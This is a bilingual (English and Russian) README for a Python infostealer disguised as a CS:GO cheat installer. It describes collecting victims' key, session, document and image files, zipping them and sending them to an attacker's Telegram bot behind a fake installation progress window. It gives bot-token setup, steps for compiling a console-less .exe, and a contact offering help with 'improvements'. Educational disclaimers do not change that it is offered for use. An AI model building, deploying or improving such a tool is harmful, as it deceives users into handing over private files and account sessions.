ENGLISH:

---

# CS\:GO Cheat Installer (Disguised File Collector)

This script is disguised as a cheat installer for CS\:GO and collects files with specified extensions from the user's computer. The collected files are archived into several ZIP files, each up to 49 MB, and sent to Telegram via a bot.

---

## Features

* **File search** in the user's home directory for extensions:
  `.keys`, `.jpg`, `.jpeg`, `.png`, `.pdf`, `.docx`, `.xlsx`, `.exe`, `.session`
* **File archiving** into several ZIP files, each up to 49 MB
* **Archive sending via Telegram** using the Telegram Bot API
* **Deceptive GUI** with a progress indicator mimicking a cheat installation
* Main operations run in the background to avoid blocking the interface

---

## Requirements

* Python 3.x
* Python libraries:

  * `requests`
  * `tkinter` (usually included with standard Python installations)

Install `requests` if not already installed:

```bash
pip install requests
```

---

## Setup

In the `agent.py` file, replace the following values with your own:

```python
BOT_TOKEN = 'your_telegram_bot_token'
CHAT_ID = 'your_chat_id'
```

---

## Running

To run the script directly:

```bash
python agent.py
```

---

## Compiling to .exe

To create an executable file without a console window, use [PyInstaller](https://pyinstaller.org):

```bash
pip install pyinstaller
pyinstaller --onefile --noconsole agent.py
```

The compiled `.exe` will be in the `dist` folder.

---

## How It Works

1. The script searches all files with target extensions in the user's home directory.
2. Creates several ZIP archives, each no more than 49 MB, to meet Telegram's limits.
3. Sends the archives via the Telegram Bot API to the specified chat.
4. Displays a simple window with a progress indicator mimicking cheat installation.
5. Runs in the background without blocking the interface.

---

## Important Notes

* Files larger than 49 MB are skipped.
* Temporary archives are deleted after sending.
* Use the script only in compliance with the law and ethical standards.
* Be sure to set up your Telegram bot and find your chat\_id.
* The code includes comments like "YOU MUST" and "You can", indicating required or optional changes. For constants — "You Must".

---

## Contact and Help

If you need improvements or help with setup, message: t.me/ErnestoMiyake

---

*This project is provided "as is" without warranties and is intended for demonstration purposes only.*

## ⚠️ The creator is not responsible for your actions. This code was created solely for educational purposes. If you build something based on this code, it should be for learning or cybersecurity-related projects that explain how to protect against such software.







RUSSIAN
# CS:GO Cheat Installer (Disguised File Collector)

Этот скрипт замаскирован под инсталлятор чита для CS:GO и выполняет сбор файлов с заданными расширениями с компьютера пользователя. Собранные файлы архивируются в несколько ZIP-архивов размером до 49 МБ каждый и отправляются в Telegram через бота.

---

## Особенности

- **Поиск файлов** в домашней папке пользователя с расширениями:  
  `.keys`, `.jpg`, `.jpeg`, `.png`, `.pdf`, `.docx`, `.xlsx`, `.exe`, `.session`
- **Архивация файлов** в несколько ZIP-файлов размером до 49 МБ каждый
- **Отправка архивов в Telegram** через Telegram Bot API
- **Обманчивый GUI** с индикатором прогресса, имитирующий установку чита
- Запуск основных операций в фоновом потоке, чтобы не блокировать интерфейс

---

## Требования

- Python 3.x  
- Библиотеки Python:
  - `requests`
  - `tkinter` (обычно включена в стандартную поставку Python)

Установите `requests`, если еще не установлен:

```bash
pip install requests
````

---

## Настройка

В файле `agent.py` необходимо заменить следующие значения на свои:

```python
BOT_TOKEN = 'ваш_токен_бота_telegram'
CHAT_ID = 'ваш_chat_id'
```

---

## Запуск

Для запуска скрипта напрямую:

```bash
python agent.py
```

---

## Компиляция в .exe

Для создания исполняемого файла без консоли используйте [PyInstaller](https://pyinstaller.org):

```bash
pip install pyinstaller
pyinstaller --onefile --noconsole agent.py
```

Собранный `.exe` будет в папке `dist`.

---

## Как работает

1. Скрипт ищет все файлы с целевыми расширениями в домашней папке пользователя.
2. Формирует несколько ZIP-архивов, каждый размером не более 49 МБ, чтобы соответствовать ограничениям Telegram.
3. Отправляет архивы через Telegram Bot API в указанный чат.
4. Отображает простое окно с индикатором прогресса, имитируя процесс установки чита.
5. Работает в фоне, не блокируя интерфейс.

---

## Важные замечания

* Файлы, которые превышают размер одного архива (49 МБ), пропускаются.
* После отправки временные архивы удаляются.
* Используйте скрипт только в соответствии с законом и этическими нормами.
* Обязательно настройте свой Telegram-бот и узнайте ваш chat_id.
* В коде есть пометки "YOU MUST" // "You can",  что означает что вы должны, или обязаны поменять. В константах - You Must

---

## Контакты и помощь

Если нужны доработки или помощь с настройкой, пишите. t.me/ErnestoMiyake

---

*Данный проект предоставляется "как есть" без гарантий и предназначен для демонстрационных целей.*
## ⚠️Создатель не несет ответственность за ваши действия, данный код был создан исключительно для учебных целях создания на основе данного кода вы должны или учится, или создавать проекты о кибер безопасности, где сказано про защиту и как защитить себя от подобных программ.
